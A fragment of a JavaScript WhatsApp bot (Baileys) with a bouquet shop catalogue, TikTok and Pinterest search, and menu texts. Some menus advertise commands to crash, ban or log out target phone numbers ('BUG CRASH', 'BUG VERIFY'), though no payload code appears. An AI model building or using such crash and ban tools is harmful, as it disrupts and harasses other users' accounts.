title: 'bouqet galaxy rose 🌷',
description: `Displays Galaxy Rose`, 
id: '.galaxyrose'
},
{
title: 'bouqet helokity 🐣',
description: `Displays Helokity`, 
id: '.helokity'
},
{
title: 'bouqet Manchester united 🛑',
description: `Displays Manchester uniated`, 
id: '.manu'
},
{
title: 'bouqet mawar 🌹', 
description: "Displays Mawar", 
id: '.mawar'
},
{
title: 'bouqet minion 🐤',
description: 'Displays Minion',
id: '.minion'
},
{
title: 'bouqet snack 🏷️',
description: 'Displays Snack',
id: '.snack'
},
{
title: 'bouqet uang 💸',
description: 'Displays Uang',
id: '.uang'
}
]}]

let listMessage = {
    title: 'List Menu',
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
interactiveMessage: proto.Message.InteractiveMessage.create({
video: fs.readFileSync('./gunung.mp4'),
caption: ' ',
gifPlayback: true,
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363267533195844@newsletter',
 newsletterName: 'Powered By WhastApp', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: kalz.decodeJid(kalz.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wek
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('© 𝗫-𝗰𝗼𝗱𝗲𝗿 𝗧𝗲𝗮𝗺 𝟮𝟬𝟮𝟰')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `👋 Hai kak${m.sender.split('@')[0]}`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e6e7d449e990e15d68ea9.jpg" 
 } }, { upload: kalz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 ],
 })
 })
 }
 }
}, {})

await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'bonekasnack': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Kalzx Store 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Bouqet boneka + snack 🐣🌹\n*Harga : ${harga1}*\n\n> Jika anda berminat untuk membeli silakan klik tombol di bawah untuk menghubungi owmer dan konfirmasi proses selanjutnya 😉`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: bonekasnack }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner 🕴️\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'edelweis': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Kalzx Store 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Bouqet bunga edelweis 🐣🌹\n*Harga : ${harga2}*\n\n> Jika anda berminat untuk membeli silakan klik tombol di bawah untuk menghubungi owmer dan konfirmasi proses selanjutnya 😉`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: edelweis }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner 🕴️\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'galaxyrose': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Kalzx Store 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Bouqet bunga galaxy rose 🐣🌹\n*Harga : ${harga3}*\n\n> Jika anda berminat untuk membeli silakan klik tombol di bawah untuk menghubungi owmer dan konfirmasi proses selanjutnya 😉`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: galaxyrose }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner 🕴️\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break


case 'helokity': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Kalzx Store 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Bouqet boneka helokity 🐣🌹\n*Harga : ${harga4}*\n\n> Jika anda berminat untuk membeli silakan klik tombol di bawah untuk menghubungi owmer dan konfirmasi proses selanjutnya 😉`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: helokity }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner 🕴️\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'manu': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Kalzx Store 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Bouqet bunga manchester united 🐣🌹\n*Harga : ${harga5}*\n\n> Jika anda berminat untuk membeli silakan klik tombol di bawah untuk menghubungi owmer dan konfirmasi proses selanjutnya 😉`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: manu }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner 🕴️\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break


case 'mawar': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Kalzx Store 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Bouqet bunga mawar 🐣🌹\n*Harga : ${harga6}*\n\n> Jika anda berminat untuk membeli silakan klik tombol di bawah untuk menghubungi owmer dan konfirmasi proses selanjutnya 😉`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: mawar }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner 🕴️\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break


case 'minion': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Kalzx Store 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Bouqet boneka minion 🐣🌹\n*Harga : ${harga7}*\n\n> Jika anda berminat untuk membeli silakan klik tombol di bawah untuk menghubungi owmer dan konfirmasi proses selanjutnya 😉`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: minion }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner 🕴️\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break


case 'snack': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Kalzx Store 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Bouqet snack / jajanan 🐣🌹\n*Harga : ${harga8}*\n\n> Jika anda berminat untuk membeli silakan klik tombol di bawah untuk menghubungi owmer dan konfirmasi proses selanjutnya 😉`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: snack }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner 🕴️\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break


case 'uang': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "© Kalzx Store 2024"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`Bouqet uang 🐣🌹\n*Harga : ${harga9}*\n\n> Jika anda berminat untuk membeli silakan klik tombol di bawah untuk menghubungi owmer dan konfirmasi proses selanjutnya 😉`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: uang }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Owner 🕴️\",\"id\":\".owner\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break


case 'spesan': case 'sendpesan': {
		 if (!isCreator) return reply(`khusus owner operator`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,Pesannya❗`)
            reply('Pesan telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
kalz.sendMessage(mq1, {text:`*───❖》KalzxFluitl《❖───*\nPesan Dari : X-Coder Coporation Tech\n\n${m2}`}, m) 
                 }
            break             

case 'tktk': {
               if (!text) return reply(`Example : ${prefix + command} jj anime`)
    let tts = await (await fetch(`https://api.shannmoderz.xyz/search/tiktok?query=${text}`)).json()
    let shannz = tts.result
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ 𝗞𝗮𝗹𝘇𝘅𝗕𝗼𝘁 - 𝗡𝗲𝘄 𝗩𝗲𝗿𝘀𝗶𝗼𝗻 𝟭.𝟴 ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: Styles(`𝗞𝗟𝗜𝗞 𝗕𝗨𝗧𝗧𝗢𝗡 𝗨𝗡𝗧𝗨𝗞 𝗡𝗘𝗫𝗧 →`),
                    subtitle: "rorr",
                    hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: shannz.no_watermark }, caption: shannz.title }, { upload: kalz.waUploadToServer }))
 }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"𝗡𝗘𝗫𝗧 ▶️\",\"id\":\".tktk ${text}\"}`
},
 ],
 })
 })
 }
 }
}, {})
await kalz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break


case 'tiktoksearch': case 'tktok': {
  if (!text) return m.reply('masukkan subjek video!')
  try {
    let tts = await (await fetch(`https://api.shannmoderz.xyz/search/tiktok?query=${text}`)).json()
    let shannz = tts.result
    kalz.sendMessage(m.chat, { video: { url: shannz.no_watermark }, caption: shannz.title },{ quoted: m })
  } catch (err) {
      m.reply('masukkan query lainnya atau coba lagi nanti')
    }
}
break

case 'cekkhodam': {
if (!text) return m.reply("Nama kamu")
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	  "Rudi Junaedi", 
	])
  
	const response = `
 
*Hasil Penerawangan Khodam 🧐 :*
• *Nama :* ${text}
• *Khodam :* ${khodam}
	  `
  
	replay(response)
  }
break

case 'pinterest': case 'pin': {
  if (!text) return reply(`example: pin nakano`);
  //try {
  await m.reply('loading');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: kalz.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `*gᥲmᑲᥲr kᥱ -${i++}*`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.ownername
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: '*⦉ 𝐏𝐈𝐍𝐓𝐄𝐑𝐄𝐒𝐓 𝐒𝐇𝐄𝐀𝐑𝐂𝐇 ⦊*',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await kalz.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break

case 'anime': case 'walpaperislami': case 'walpapermodern': case 'walpapersenja': case 'walpaperkpop': case 'idolaku': case 'wali': case 'aesthetic': case 'gunung': case 'cecan': case 'cogan': {
  if (!text) return reply(`example: ${command} namanya`);
  //try {
  await m.reply('loading');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: kalz.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `*gᥲmᑲᥲr kᥱ -${i++}*`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: global.ownername
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: '*⦉ X-CODE SEDANG MENCARI ⦊*',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"Source","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await kalz.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break


case "tqto": {
menuu = `👋 HAI KAK${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*Terimakasih Untuk Para Pengembang Script*
• DitzXploit
• Ikal
• KayyOfc
• Baileys ( Server )
• WhisKeyy ( Server Socket )
• WhatsApp ( Penyedia Layanan )

*NOTE  ❗: JANGAN PERSALAH GUNAKAN BOT INI DEMI KEPENTINGAN PRIBADI KARENA BOT INI DI CIPTAKAN UNTUK MEMPERMUDAH MENGAKSES*

`
await reply(Styles(menuu));
}
break
case "panelmenu": {
menuu = `👋 HAI KAK${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*PANEL MENU*
${tanda} ${prefix}panel
${tanda} ${prefix}addusr
${tanda} ${prefix}addsrv
${tanda} ${prefix}admin
${tanda} ${prefix}delusr
${tanda} ${prefix}delsrv
${tanda} ${prefix}detusr
${tanda} ${prefix}listadmin
${tanda} ${prefix}listusr
${tanda} ${prefix}listsrv
${tanda} ${prefix}reinstall
${tanda} ${prefix}restartsrv
${tanda} ${prefix}ramlist
${tanda} ${prefix}spanel
${tanda} ${prefix}startsrv
${tanda} ${prefix}stopsrv
${tanda} ${prefix}suspend
${tanda} ${prefix}tutorial
${tanda} ${prefix}unsuspend 
${tanda} ${prefix}updatesrv
${tanda} ${prefix}webpanel

`
await reply(Styles(menuu));
}
break
case "othermenu": {
menuu = `👋 HAI KAK${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*OTHER MENU*
${tanda} ${prefix}ai 
${tanda} ${prefix}simi
${tanda} ${prefix}cekhodam
${tanda} ${prefix}addcase
${tanda} ${prefix}delcase
${tanda} ${prefix}listcase
${tanda} ${prefix}getcase 
${tanda} ${prefix}totalfitur
${tanda} ${prefix}public
${tanda} ${prefix}self
${tanda} ${prefix}restart
${tanda} ${prefix}runtime
${tanda} ${prefix}addprem
${tanda} ${prefix}delprem
${tanda} ${prefix}listprem
${tanda} ${prefix}upsw
${tanda} ${prefix}getsw
${tanda} ${prefix}listsw
${tanda} ${prefix}bcgc
${tanda} ${prefix}bcimg
${tanda} ${prefix}sticker
${tanda} ${prefix}payment
${tanda} ${prefix}qc
${tanda} ${prefix}hdr
${tanda} ${prefix}autoread
${tanda} ${prefix}autobio
${tanda} ${prefix}pushkontak2
${tanda} ${prefix}listgc
${tanda} ${prefix}tourl
${tanda} ${prefix}toimg
${tanda} ${prefix}tovideo
${tanda} ${prefix}emojimix
${tanda} ${prefix}emojimix2
${tanda} ${prefix}jpm
${tanda} ${prefix}jpm1
    
`
await reply(Styles(menuu));
}
break
case "downloadmenu": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*DOWNLOAD MENU*
${tanda} ${prefix}sposearch 
${tanda} ${prefix}yts
${tanda} ${prefix}ytmp3
${tanda} ${prefix}ytmp4
${tanda} ${prefix}tt
${tanda} ${prefix}tktk
${tanda} ${prefix}instagram
${tanda} ${prefix}play
${tanda} ${prefix}spotify
  
`
await reply(Styles(menuu));
}
break
case "groupmenu": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*GROUP MENU*
${tanda} ${prefix}totag
${tanda} ${prefix}hidetag
${tanda} ${prefix}tagall
${tanda} ${prefix}linkgc
${tanda} ${prefix}resetlinkgc
${tanda} ${prefix}sendlinkgc
${tanda} ${prefix}promote

  
`
await reply(Styles(menuu));
}
break
case "storemenu": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*STORE MENU*
${tanda} ${prefix}batal
${tanda} ${prefix}done
${tanda} ${prefix}listpanel
${tanda} ${prefix}proses
${tanda} ${prefix}reqpanel
${tanda} ${prefix}sewa
${tanda} ${prefix}sewabot
${tanda} ${prefix}spanel
${tanda} ${prefix}tunda
  
`
await reply(Styles(menuu));
}
break
case "bugnumber": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*BUG NUMBER*
${tanda} ${prefix}🔥 62898xxxxx
${tanda} ${prefix}☕ 62898xxxxx
${tanda} ${prefix}🌷 62898xxxxx

`
await reply(Styles(menuu));
}
break
case "bugverify": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*BUG VERIFY*
${tanda} ${prefix}verify 62898xxxx
${tanda} ${prefix}banned 62898xxxx
${tanda} ${prefix}basmi 62898xxxx
${tanda} ${prefix}logout 62898xxxx
${tanda} ${prefix}kenon 62898xxxx
`
await reply(Styles(menuu));
}
break
case "bugcrash": {
menuu = `👋 ʜɪ ᴋᴀᴋ${m.sender.split('@')[0]}

*INFO BOT*
𒆜 *NAMA BOT* : ${global.botname}
𒆜 *NAMA OWNER* : ${global.ownername}
𒆜 *RUNTIME* : ${runtime(process.uptime())}

*BUG CRASH*
${tanda} ${prefix}xcrash
${tanda} ${prefix}xioscrash2
${tanda} ${prefix}xcrash
${tanda} ${prefix}xcrash2
${tanda} ${prefix}delaybug
${tanda} ${prefix}pmbug
${tanda} ${prefix}amountbug
`
await reply(Styles(menuu));
}
break
//=============== F E A T U R E ======================//
// PanelMenu
case "1gb": {
        if (!isPrem) return reply(`maaf kamu tidak diizinkan untuk membuat panel saat ini`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
